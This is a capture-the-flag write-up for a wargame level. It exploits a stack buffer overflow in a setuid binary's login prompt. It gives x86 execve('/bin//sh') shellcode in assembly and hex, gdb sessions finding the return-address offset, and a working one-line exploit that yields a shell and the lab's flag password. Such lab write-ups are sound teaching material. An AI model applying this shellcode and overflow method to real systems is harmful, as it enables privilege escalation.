# LEVEL01 - STACK BUFFER OVERFLOW 1 - SHELLCODE

We will now use Ghidra/HexRays to decompile future binaries as they can be quite long in asm

We have a binary named level01 at /home/users/level01/

It is owned by `level02`, has a `setuid bit` and `NX` is disabled

The program first define some buffers
```c
#include <string.h>
#include <stdio.h>

char username[100];
```
```c
int main(void)
{
	char password[64];
```

Then, it prints some lines and then calls fgets to ask for user input
```c
memset(password, 0, sizeof(password));
puts("********* ADMIN LOGIN PROMPT *********");
printf("Enter Username: ");
fgets(username, 256, 0);
```

We can already see a buffer overflow of 156 bytes on `username`
```c
char username[100];
```
```c
fgets(username, 256, 0);
```

The code then calls the `verify_user_name` function which checks if the username provided by the user is `dat_wil` and if not, returns.
```c
if (verify_user_name(username))
{
	puts("nope, incorrect username...\n");
}
```
```c
int verify_user_name(char *username)
{
	puts("verifying username....\n");
	return memcmp(username, "dat_wil", 7) != 0;
}
```

Next, the program prompts for the password and we can see another buffer overflow of 36 bytes with `password`
```c
else
	{
		puts("Enter Password: ");
		fgets(password, 100, 0);
```
```c
char password[64];
```

The code then calls the `verify_user_pass` function which checks is the username provided by the user is `admin` and in all cases print `"nope, incorrect password...\n"`, then returns
```c
verify_user_pass(password);
puts("nope, incorrect password...\n");
```
```c
int verify_user_pass(char *password)
{
	return memcmp(password, "admin", 5) != 0;
}
```

No shell is executed within this code, we will have to inject a shellcode which executes a shell.

Here is a simple x86 shellcode that calls `execve("/bin//sh")`
We need to add a `/` to prevent the `\x00` (a hole in the 4 bytes groups) character to be added to the shellcode causing the execution to be terminated
```asm
xor eax, eax  	#Empties the register used by syscalls (execve is a syscall)
xor ecx, ecx
xor edx, edx
xor edi, edi
xor esi, esi
                  
push edx		#Pushing '\0' onto the stack
push 0x68732f2f	#Pushing 'hs//' onto the stack
push 0x6e69622f	#Pushing 'nib/' onto the stack
                  
mov ebx, esp	#Putting the stack top address inside ebx (first parameter)	
mov al, 0x0b	#Putting execve (0x0b hex/11 dec) inside al
int 0x80		#Executing the syscall
```

We have to store and execute this shellcode, `NX` being disabled we can store it and execute it in one of the two stack buffers (`username` and `password`)

Luckily the `password` buffer is declared at top of the main function which means that overflowing this buffer will write on the return address of the main function.

We have to store the shellcode inside the `password` buffer, get the address of the `password` buffer and rewrite the return address of the `main` function with it.

Using `gdb` we can get the address of the `password` buffer: `0xffffd6cc`
```
0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
```
```
(gdb) b*0x08048580
Breakpoint 1 at 0x8048580
(gdb) r < <(echo dat_wil; echo P4SSW0RD)
Starting program: /home/users/level01/level01 < <(echo dat_wil; echo P4SSW0RD)
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:

Breakpoint 1, 0x08048580 in main ()
```
```
(gdb) info reg
eax		0xffffd6cc	-10548
(gdb) x/s 0xffffd6cc
0xffffd6cc:      "P4SSW0RD\n"
```

Now we have find the offset between the end of the buffer and the return address
```
(gdb) r < <(echo dat_wil; python -c "print('a'*80+'ABCD')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level01/level01 < <(echo dat_wil; python -c "print('a'*80+'ABCD')")
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:

Breakpoint 1, 0x08048580 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd720:
 eip = 0x8048580 in main; saved eip 0x44434241
```

The `saved eip` (the return address of the main) has successfully been overwritten with `0x44434241` (`'DCBA'`) using this prompt:
```bash
python -c "print('a' * 80 + 'ABCD')"
```
Which prints this output:
```
aaa...(80 total a)...aaaABCD
```

So we have 80 bytes to store our shellcode starting at `0xffffd6cc`, then we have 4 bytes for the return address that we have to replace by `0xffffd6cc`

Now we can craft our input, first let's traduce our shellcode in machine code, you can traditionally code a shellcode in c, compile it then use `objdump` to get the hexadecimal values of the machine code but in these exercises i'll use `pwntools` `python3 package` for simplicity purposes for crafting my entire inputs

First let's import the library
```python
#!/usr/bin/python
import pwn
```

Here is our asm shellcode
```python
hexcode = pwn.asm('''
                  xor eax, eax
                  xor ecx, ecx
                  xor edx, edx
                  xor edi, edi
                  xor esi, esi
                  
                  push edx
                  push 0x68732f2f
                  push 0x6e69622f
                  
                  mov ebx, esp
                  mov al, 0x0b
                  int 0x80
                  ''').hex()
```

We can print it:
```
31c031c931d231ff31f652682f2f7368682f62696e89e3b00bcd80
```

We have to format this output for it to be printable by python, we have to separate each bytes and precede each byte with `\x` for python to write the byte as hexadecimal value, this hexcode is already in little endian

```
\x31\xc0\x31\xc9\x31\xd2\x31\xff\x31\xf6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

This shellcode is only 27 bytes long so we have to add 53 filling characters to fill the 80 bytes before printing the address, after checking `python` is installed on the OverRide machine we can use it to add filling easily

```bash
python -c "print('[SHELLCODE HERE]' + 53 * 'a')"
```

Now we have to convert to little endian, separate the bytes and add `\x` for the address:
```
\xcc\xd6\xff\xff
```

Our input command now looks like this:
```bash
python -c "print('[SHELLCODE HERE]' + 53 * 'a' + '\xcc\xd6\xff\xff')"
```

Let's try it using `gdb`
```
   0x080485b5 <+229>:   ret
End of assembler dump.
(gdb) b*0x080485b5
Breakpoint 1 at 0x80485b5
(gdb) r < <(echo dat_wil; python -c "print('\x31\xc0\x31\xc9\x31\xd2\x31\xff\x31\xf6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'+53*'a'+'
\xcc\xb8\xff\xff')")
```
```
Breakpoint 1, 0x080485b5 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd720:
 eip = 0x80485b5 in main; saved eip 0xffffd6cc
```

The `saved eip` has successfully been overwritten by `0xffffd6cc`

We can display the instruction located at this address to be sure it's our shellcode and that it was well inserted
```
(gdb) x/15i 0xffffd6cc
   0xffffd6cc:  xor    %eax,%eax
   0xffffd6ce:  xor    %ecx,%ecx
   0xffffd6d0:  xor    %edx,%edx
   0xffffd6d2:  xor    %edi,%edi
   0xffffd6d4:  xor    %esi,%esi
   0xffffd6d6:  push   %edx
   0xffffd6d7:  push   $0x68732f2f
   0xffffd6dc:  push   $0x6e69622f
   0xffffd6e1:  mov    %esp,%ebx
   0xffffd6e3:  mov    $0xb,%al
   0xffffd6e5:  int    $0x80
   0xffffd6e7:  popa
   0xffffd6e8:  popa
   0xffffd6e9:  popa
   0xffffd6ea:  popa
```

Our shellcode is successfuly setup, we can continue the execution to see if it worked
```
(gdb) c
Continuing.
process 1751 is executing new program: /bin/dash
warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
Architecture of file not recognized.
```

Knowing this challenge takes place on a `x86-64` machine but that binary is `x86` we can ignore this error, the shell has been successfully executed:

`process 1751 is executing new program: /bin/dash`

Now we have to test it without `gdb` because `setuid bit` does not work if `gdb` is used on the binary

The addresses on a "real" situation will slightly differ from the ones from gdb which means we have an offset between `0xffffd6cc` and the "real" buffer address, we can craft a small bash or python script to test a bunch of addresses starting from `0xffffd6cc` up to `0xffffd6ff` and see one work

In this case I have determined that there is a 32 bytes offset between the gdb and non-gdb adresses, the new address is `0xffffd6ec`, let's try our input updated with the right address

We will also add `cat` to the command to prevent the program for returning right after executing `/bin/sh`

```bash
(echo dat_wil; python -c "print('\x31\xc0\x31\xc9\x31\xd2\x31\xff\x31\xf6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'+53*'a'+'\xec\xd6\xff\xff')"; cat) | ./level01
```

We can try the `whoami` command to be sure we are connected in the shell as `level02` and then cat the `/home/users/level02/.pass` file to get the flag
```
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```